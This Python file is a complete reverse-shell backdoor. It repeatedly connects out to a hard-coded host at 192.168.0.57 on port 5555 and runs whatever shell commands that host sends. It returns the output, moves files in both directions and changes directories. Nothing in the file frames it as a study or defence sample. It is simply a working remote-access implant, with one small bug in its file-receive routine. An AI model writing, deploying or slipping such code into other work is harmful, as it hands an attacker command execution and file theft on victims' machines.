import socket
import time
import json
import subprocess
import os


def sender(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def receiver():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    with open(file_name, "rb") as f:
        sock.send(f.read())


def download_file(file_name):
    with open(file_name, "wb") as f:
        sock.settimeout(1)
        chunk = sock.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as err:
                break
        sock.settimeout(None)


def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.0.57", 5555))
            shell()
            sock.close()
            break
        except:
            connection()


def shell():
    while True:
        command = receiver()
        if command == "quit":
            break
        elif command == "clear":
            pass
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:6] == "upload":
            download_file(command[7:])
        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            sender(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
